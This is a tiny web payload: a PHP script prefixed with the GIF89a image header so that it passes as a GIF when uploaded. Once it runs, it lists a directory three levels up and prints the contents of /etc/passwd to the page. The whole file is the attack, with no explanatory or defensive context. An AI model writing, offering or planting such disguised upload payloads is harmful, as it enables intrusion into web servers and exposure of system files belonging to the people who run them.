GIF89a;
<?php
$dir = "../../../";
$a = scandir($dir);
$b =file_get_contents("/etc/passwd");
print_r($a);
print_r($b);
echo "<pre> $a </pre>";
echo "<pre> $b </pre>";
?>
